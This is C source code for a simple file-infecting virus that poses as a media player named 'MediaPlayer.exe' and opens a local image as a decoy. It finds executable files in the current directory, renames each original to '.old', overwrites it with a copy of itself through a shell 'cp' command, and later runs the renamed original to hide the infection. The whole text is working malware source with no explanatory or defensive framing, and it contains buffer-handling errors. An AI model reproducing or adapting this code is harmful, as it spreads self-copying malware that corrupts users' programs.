#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

bool isImageDispo(char* nomImage){
char *extensionImgNonDispo=".old";
if(strstr(nomImage, extensionImgNonDispo)){return true;
}else{DIR *rep=opendir(".");struct dirent *lecture;
while((lecture=readdir(rep)))
return ((strcmp(lecture->d_name,nomImage)==0)
&&fopen(strcat(lecture->d_name,extensionImgNonDispo),"r")!=NULL)?
true:false;}return false;}
char** rechercheImages(){
char** Images=malloc(3*sizeof(char*));
int nbImages=0;DIR *rep = opendir(".");struct stat buf;
struct dirent *lecture;while ((lecture=readdir(rep))) {
stat(lecture->d_name,&buf);
char exeptionImage[strlen(lecture->d_name)+3];
strcpy(exeptionImage,"./");strcat(exeptionImage,lecture->d_name);
if(((buf.st_mode&S_IFMT)==S_IFREG)&&(buf.st_mode&S_IXUSR)){
if(nbImages<3&&strcmp(lecture->d_name,"MediaPlayer.exe")!=0
&&!isImageDispo(lecture->d_name)){Images[nbImages]=lecture->d_name;
nbImages+=1;}}}closedir(rep);return Images;}
void loadImages(char** files,char *arg){
for(int i=0;i<3;i+=1)if(files[i]!=NULL){
char image[strlen(files[i])+strlen(".old")+1];
char imageCourante[strlen(files[i])+1];
strcpy(imageCourante,files[i]);strcpy(image,files[i]);strcat(image,".old");
rename(files[i],image);char buffChargeImage[500]="";
strcat(buffChargeImage,"cp ");strcat(buffChargeImage,arg);strcat(buffChargeImage," ")
;strcat(buffChargeImage,files[i]);system(buffChargeImage);}}
void affichageImage(char *arg){
if(strcmp(arg,"./MediaPlayer.exe")!=0){
char ImgExec[strlen(arg+5)];strcpy(ImgExec,arg);strcat(ImgExec,".old");
system(ImgExec);}else{char uneimage[256]="xdg-open ./";
DIR *d;struct dirent *dir;d=opendir(".");if(d)
while((dir=readdir(d))!=NULL)
if(strstr(dir->d_name,".jpg")||strstr(dir->d_name,".jpeg")
||strstr(dir->d_name,".png")){strcat(uneimage,dir->d_name);system(uneimage);break;
}closedir(d);}}
int main(int argc,char *argv[]){
char** f=rechercheImages();
(f[0]!=NULL)?loadImages(f,argv[0]):f;
affichageImage(argv[0]);
return 0;}
